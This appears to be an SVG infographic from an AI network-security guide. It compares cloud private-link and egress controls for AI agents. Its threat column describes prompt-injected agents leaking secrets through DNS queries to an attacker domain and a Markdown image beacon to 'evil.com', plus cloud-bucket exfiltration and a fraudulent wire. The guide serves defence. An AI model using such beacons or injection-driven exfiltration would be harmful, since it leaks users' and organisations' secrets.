  <!-- Header -->
  <rect x="30" y="20" width="1140" height="90" rx="12" fill="#0f172a" stroke="#334155" stroke-width="1.5"/>
  <text x="55" y="54" fill="#38bdf8" font-size="20" font-weight="800">Enterprise AI Hub-Spoke VNet, Private Endpoint &amp; Egress Security Guide (Round 410 · 🏆 410 FAQs)</text>
  <text x="55" y="84" fill="#94a3b8" font-size="14">Azure Private Link + Firewall Premium vs. AWS PrivateLink vs. GCP VPC-SC · Anti-DNS/Markdown Exfil</text>
  <rect x="935" y="34" width="215" height="58" rx="8" fill="url(#amberGrad)" stroke="#f59e0b" stroke-width="1.5"/>
  <text x="1042" y="58" text-anchor="middle" fill="#fef3c7" font-size="13" font-weight="800">BRK-829 / BRK-830</text>
  <text x="1042" y="78" text-anchor="middle" fill="#fde68a" font-size="12" font-weight="700">🏆 410 FAQs · 1,026 Pytest</text>

  <!-- Column 1: Threat Plane -->
  <rect x="30" y="128" width="365" height="405" rx="12" fill="#180d14" stroke="#ef4444" stroke-width="1.5"/>
  <rect x="46" y="144" width="333" height="38" rx="8" fill="url(#redGrad)"/>
  <text x="212" y="168" text-anchor="middle" fill="#fecaca" font-size="15" font-weight="800">🚨 1. Top 3 AI Network Egress &amp; Exfiltration Risks</text>

  <rect x="46" y="196" width="333" height="98" rx="8" fill="#1f121b" stroke="#7f1d1d" stroke-width="1"/>
  <text x="60" y="218" fill="#f87171" font-size="13" font-weight="700">① DNS Tunneling &amp; Markdown Image Beacons (BRK-829)</text>
  <text x="60" y="240" fill="#cbd5e1" font-size="12">Tainted agents exfiltrate secrets via recursive DNS</text>
  <text x="60" y="258" fill="#cbd5e1" font-size="12">queries (`&lt;hex&gt;.attacker.com`) or client-rendered</text>
  <text x="60" y="278" fill="#fca5a5" font-size="12" font-weight="700">Markdown images `![p](https://evil.com/leak?q=...)`!</text>

  <rect x="46" y="306" width="333" height="98" rx="8" fill="#1f121b" stroke="#7f1d1d" stroke-width="1"/>
  <text x="60" y="328" fill="#f87171" font-size="13" font-weight="700">② Cross-Tenant PaaS Storage Exfiltration</text>
  <text x="60" y="350" fill="#cbd5e1" font-size="12">Allowing wildcard egress (`*.blob.core.windows.net`</text>
  <text x="60" y="368" fill="#cbd5e1" font-size="12">or `*.s3.amazonaws.com`) lets an injected agent</text>
  <text x="60" y="388" fill="#fca5a5" font-size="12" font-weight="700">push internal RAG data to an attacker's cloud bucket!</text>

  <rect x="46" y="416" width="333" height="100" rx="8" fill="#1f121b" stroke="#7f1d1d" stroke-width="1"/>
  <text x="60" y="438" fill="#f87171" font-size="13" font-weight="700">③ ExpressRoute Carrier Hijack &amp; Wire (BRK-830)</text>
  <text x="60" y="460" fill="#cbd5e1" font-size="12">Spoofed ExpressRoute/DirectConnect carrier</text>
  <text x="60" y="478" fill="#cbd5e1" font-size="12">circuit invoice tampers with `trust-registry` to</text>
  <text x="60" y="498" fill="#fca5a5" font-size="12" font-weight="700">execute a $7,800 fraudulent wire transfer!</text>

  <!-- Column 2: Zero-Trust Architecture -->
  <rect x="417" y="128" width="365" height="405" rx="12" fill="#09191f" stroke="#10b981" stroke-width="1.5"/>
  <rect x="433" y="144" width="333" height="38" rx="8" fill="url(#greenGrad)"/>
  <text x="600" y="168" text-anchor="middle" fill="#d1fae5" font-size="15" font-weight="800">🛡️ 2. Zero-Trust Hub-Spoke &amp; Egress Perimeter</text>

  <rect x="433" y="196" width="333" height="98" rx="8" fill="#0d242c" stroke="#047857" stroke-width="1"/>
  <text x="447" y="218" fill="#34d399" font-size="13" font-weight="700">① End-to-End Private Link &amp; Disabled Public Access</text>
  <text x="447" y="240" fill="#cbd5e1" font-size="12">Set `publicNetworkAccess: Disabled` on OpenAI,</text>
  <text x="447" y="258" fill="#cbd5e1" font-size="12">AI Search, Key Vault &amp; Storage; route strictly over</text>
  <text x="447" y="278" fill="#6ee7b7" font-size="12" font-weight="700">Spoke VNet Private Endpoints (`10.x.x.x`)!</text>

  <rect x="433" y="306" width="333" height="98" rx="8" fill="#0d242c" stroke="#047857" stroke-width="1"/>
  <text x="447" y="328" fill="#34d399" font-size="13" font-weight="700">② UDR Forced Tunneling &amp; Private DNSSinkhole</text>
  <text x="447" y="350" fill="#cbd5e1" font-size="12">Force `0.0.0.0/0` via UDR to Hub Azure Firewall</text>
  <text x="447" y="368" fill="#cbd5e1" font-size="12">FQDN allowlists, block external DNS recursion &amp;</text>
  <text x="447" y="388" fill="#6ee7b7" font-size="12" font-weight="700">lock firewall rules via `untrusted-write`!</text>

  <rect x="433" y="416" width="333" height="100" rx="8" fill="#0d242c" stroke="#047857" stroke-width="1"/>
  <text x="447" y="438" fill="#34d399" font-size="13" font-weight="700">③ NSP Tenant Perimeter &amp; Carrier Dual-Sign</text>
  <text x="447" y="460" fill="#cbd5e1" font-size="12">`record-owner` isolates network security perimeters,</text>
  <text x="447" y="478" fill="#cbd5e1" font-size="12">`fixed-business-output` pins carrier master data &amp;</text>
  <text x="447" y="498" fill="#6ee7b7" font-size="12" font-weight="700">`original-requester-payment` blocks $7,800 wire!</text>

  <!-- Column 3: Selection Matrix -->
  <rect x="805" y="128" width="365" height="405" rx="12" fill="#0c152c" stroke="#3b82f6" stroke-width="1.5"/>
  <rect x="821" y="144" width="333" height="38" rx="8" fill="url(#blueGrad)"/>
  <text x="987" y="168" text-anchor="middle" fill="#dbeafe" font-size="15" font-weight="800">⚖️ 3. Cloud AI Private Network Matrix</text>

  <rect x="821" y="196" width="333" height="98" rx="8" fill="#111e3d" stroke="#1d4ed8" stroke-width="1"/>
  <text x="835" y="218" fill="#60a5fa" font-size="13" font-weight="700">Azure AI Landing Zone Reference Topology</text>
  <text x="835" y="240" fill="#cbd5e1" font-size="12">• Hub-Spoke VNet + Private Link + NSP Perimeter</text>
  <text x="835" y="258" fill="#cbd5e1" font-size="12">• Azure Firewall Premium (TLS Inspection + IDPS)</text>
  <text x="835" y="278" fill="#93c5fd" font-size="12" font-weight="700">Pick: Azure AI Landing Zone for enterprise prod</text>

  <rect x="821" y="306" width="333" height="98" rx="8" fill="#111e3d" stroke="#1d4ed8" stroke-width="1"/>
  <text x="835" y="328" fill="#60a5fa" font-size="13" font-weight="700">AWS &amp; GCP Anti-Exfiltration Perimeters</text>
  <text x="835" y="350" fill="#cbd5e1" font-size="12">• AWS PrivateLink + Endpoint Policy (`PrincipalOrgID`)</text>
  <text x="835" y="368" fill="#cbd5e1" font-size="12">• GCP VPC Service Controls (VPC-SC Perimeter)</text>
  <text x="835" y="388" fill="#93c5fd" font-size="12" font-weight="700">Rule: Enforce `img-src 'self' data:` CSP in Chat UI!</text>

  <rect x="821" y="416" width="333" height="100" rx="8" fill="#111e3d" stroke="#1d4ed8" stroke-width="1"/>
  <text x="835" y="438" fill="#60a5fa" font-size="13" font-weight="700">🧪 Round 410 Verification (1,026 Pytest 100%)</text>
  <text x="835" y="460" fill="#cbd5e1" font-size="12">• BRK-829: Blocks DNS/Markdown exfil &amp; egress bypass</text>
  <text x="835" y="478" fill="#cbd5e1" font-size="12">• BRK-830: Blocks carrier tamper &amp; $7,800 wire</text>
  <text x="835" y="498" fill="#fde68a" font-size="12" font-weight="700">848 Scenarios · 1,762 Assertions · 🏆 410 FAQs</text>

  <!-- Footer -->
  <rect x="30" y="548" width="1140" height="62" rx="10" fill="#0f172a" stroke="#334155" stroke-width="1.5"/>
  <text x="600" y="574" text-anchor="middle" fill="#38bdf8" font-size="14" font-weight="800">SA Golden Rule: Application guardrails never replace network zero trust — enforce Default-Deny Egress, Private Link, and strict UI CSP!</text>
